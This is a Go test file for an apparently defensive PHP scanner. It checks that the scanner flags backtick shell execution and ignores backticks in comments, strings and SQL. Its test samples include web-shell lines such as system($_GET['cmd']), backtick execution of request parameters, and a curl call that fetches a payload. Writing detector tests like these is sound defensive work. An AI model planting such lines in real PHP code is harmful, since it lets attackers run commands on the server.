package analyzer

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Lutfifakee-Project/ronda/internal/finding"
)

// btPHP builds a PHP source file from code lines using the repo's safe
// character helpers (no literal fragile characters in this source file).
func btPHP(lines ...string) string {
	out := "<?php" + regNL
	for i := 0; i < len(lines); i++ {
		out += lines[i] + regNL
	}
	return out
}

// dollarVar keeps this test source free of literal dollar signs.
func dollarVar(name string) string { return sigil() + name }

// backtickFindingsOf returns only the backtick execution findings.
func backtickFindingsOf(found []finding.Finding) []finding.Finding {
	var out []finding.Finding
	for i := 0; i < len(found); i++ {
		if found[i].Title == "PHP backtick shell execution" {
			out = append(out, found[i])
		}
	}
	return out
}

func TestBacktickStaticExecution(t *testing.T) {
	cases := map[string]string{
		"id":     btPHP(dollarVar("output") + " = " + tick() + "id" + tick() + ";"),
		"whoami": btPHP(dollarVar("output") + " = " + tick() + "whoami" + tick() + ";"),
		"curl":   btPHP(dollarVar("output") + " = " + tick() + "curl https://example.invalid/payload" + tick() + ";"),
	}
	for name, src := range cases {
		found := backtickFindingsOf(AnalyzeBytes(name+".php", []byte(src)))
		if len(found) != 1 {
			t.Fatalf("%s: expected 1 backtick finding, got %d (%+v)", name, len(found), found)
		}
		if found[0].Severity != finding.High {
			t.Fatalf("%s: severity=%s, want HIGH", name, found[0].Severity)
		}
		if !strings.Contains(found[0].Evidence, "static command") {
			t.Fatalf("%s: evidence=%q", name, found[0].Evidence)
		}
		if found[0].Status != finding.Suspicious {
			t.Fatalf("%s: status=%s", name, found[0].Status)
		}
	}
}

func TestBacktickVariableInterpolation(t *testing.T) {
	src := btPHP(
		dollarVar("command")+" = 'id';",
		dollarVar("output")+" = "+tick()+sigil()+"command"+tick()+";",
	)
	found := backtickFindingsOf(AnalyzeBytes("interp.php", []byte(src)))
	if len(found) != 1 {
		t.Fatalf("expected 1 backtick finding, got %d (%+v)", len(found), found)
	}
	if found[0].Severity != finding.High {
		t.Fatalf("severity=%s, want HIGH (static analysis cannot prove user control)", found[0].Severity)
	}
	if !strings.Contains(found[0].Evidence, "variable interpolation") {
		t.Fatalf("evidence=%q", found[0].Evidence)
	}
}

func TestBacktickGetSuperglobal(t *testing.T) {
	src := btPHP(dollarVar("out") + " = " + tick() + sigil() + "_GET['cmd']" + tick() + ";")
	found := backtickFindingsOf(AnalyzeBytes("get.php", []byte(src)))
	if len(found) != 1 {
		t.Fatalf("expected 1 backtick finding, got %d (%+v)", len(found), found)
	}
	if found[0].Severity != finding.Critical {
		t.Fatalf("severity=%s, want CRITICAL", found[0].Severity)
	}
	if !strings.Contains(found[0].Evidence, "user-controlled input") {
		t.Fatalf("evidence=%q", found[0].Evidence)
	}
}

func TestBacktickPostSuperglobal(t *testing.T) {
	src := btPHP(dollarVar("out") + " = " + tick() + sigil() + "_POST['c']" + tick() + ";")
	found := backtickFindingsOf(AnalyzeBytes("post.php", []byte(src)))
	if len(found) != 1 {
		t.Fatalf("expected 1 backtick finding, got %d (%+v)", len(found), found)
	}
	if found[0].Severity != finding.Critical {
		t.Fatalf("severity=%s, want CRITICAL", found[0].Severity)
	}
}

func TestBacktickModifiedCorePHP(t *testing.T) {
	src := btPHP(
		dollarVar("wp_version")+" = '6.4.2';",
		dollarVar("out")+" = "+tick()+"id"+tick()+";",
	)
	found := backtickFindingsOf(AnalyzeBytes("version.php", []byte(src)))
	if len(found) != 1 {
		t.Fatalf("modified core with backtick operator must be flagged, got %+v", found)
	}
	if found[0].Severity != finding.High {
		t.Fatalf("severity=%s", found[0].Severity)
	}
}

func TestBacktickMultipleOperators(t *testing.T) {
	src := btPHP(
		dollarVar("a")+" = "+tick()+"id"+tick()+";",
		dollarVar("b")+" = "+tick()+"whoami"+tick()+";",
	)
	found := backtickFindingsOf(AnalyzeBytes("multi.php", []byte(src)))
	if len(found) != 2 {
		t.Fatalf("expected 2 backtick findings, got %d (%+v)", len(found), found)
	}
}

// TestBacktickNoSuppressionOfAggregate proves the aggregate detection and the
// backtick detection coexist: nothing is suppressed to reduce false positives.
func TestBacktickNoSuppressionOfAggregate(t *testing.T) {
	src := btPHP(
		"system("+sigil()+"_GET['cmd']);",
		dollarVar("out")+" = "+tick()+"id"+tick()+";",
	)
	found := AnalyzeBytes("combo.php", []byte(src))
	// Phase 4: aggregate + backtick + established request-to-shell flow.
	if len(found) != 3 {
		t.Fatalf("expected aggregate + backtick + correlation findings, got %d (%+v)", len(found), found)
	}
	if found[0].Title != "Suspicious PHP code" {
		t.Fatalf("aggregate finding missing: %+v", found[0])
	}
	if found[1].Title != "PHP backtick shell execution" {
		t.Fatalf("backtick finding missing: %+v", found[1])
	}
}

func TestBacktickNegativeContexts(t *testing.T) {
	tickc := tick()
	cases := map[string]string{
		"line_comment":  btPHP("// run " + tickc + "id" + tickc + " from docs"),
		"hash_comment":  btPHP("# run " + tickc + "id" + tickc + " from docs"),
		"block_comment": btPHP("/* shell example: " + tickc + "id" + tickc + " */"),
		"docblock_prose": btPHP("/**",
			" * Executes nothing; mentions "+tickc+"id"+tickc+" in prose.",
			" */",
			"echo 'ok';"),
		"single_quoted": btPHP("echo 'use the " + tickc + "id" + tickc + " operator docs';"),
		"double_quoted": btPHP("echo \"use the " + tickc + "id" + tickc + " operator docs\";"),
		"sql_example":   btPHP("function q() { return 'SELECT " + tickc + "id" + tickc + ", " + tickc + "name" + tickc + " FROM " + tickc + "wp_options" + tickc + "'; }"),
		"heredoc":       btPHP(dollarVar("doc")+" = <<<EOT", "shell example "+tickc+"id"+tickc, "EOT;"),
		"nowdoc":        btPHP(dollarVar("doc")+" = <<<'EOT'", "shell example "+tickc+"id"+tickc, "EOT;"),
		"inline_html":   btPHP("echo 'x';", "?>", "Markdown text with "+tickc+"id"+tickc+" backticks"+"<?php echo 'y';"),
		"markdown_not_php": "# README" + regNL +
			"Run " + tickc + "id" + tickc + " in a shell." + regNL,
		"sql_file_not_php": "SELECT " + tickc + "id" + tickc + " FROM " + tickc + "wp_options" + tickc + ";" + regNL,
	}
	for name, src := range cases {
		found := AnalyzeBytes(name+".php", []byte(src))
		if len(found) != 0 {
			t.Errorf("%s: false positive: %+v", name, found)
		}
	}
}

func TestBacktickExistingLegitFixturesUnchanged(t *testing.T) {
	// The pre-existing negative fixtures must produce no findings at all now
	// that backtick detection is wired in.
	for name, src := range negFixtures() {
		found := AnalyzeBytes(name, []byte(src))
		if len(found) != 0 {
			t.Errorf("%s: false positive after integration: %+v", name, found)
		}
	}

	// The repository's legitimate web fixture must stay clean.
	data, err := os.ReadFile(filepath.Join("..", "..", "tests", "fixtures", "web", "clean.php"))
	if err != nil {
		t.Fatal(err)
	}
	found := AnalyzeBytes("clean.php", data)
	if len(found) != 0 {
		t.Errorf("clean.php fixture flagged: %+v", found)
	}
}
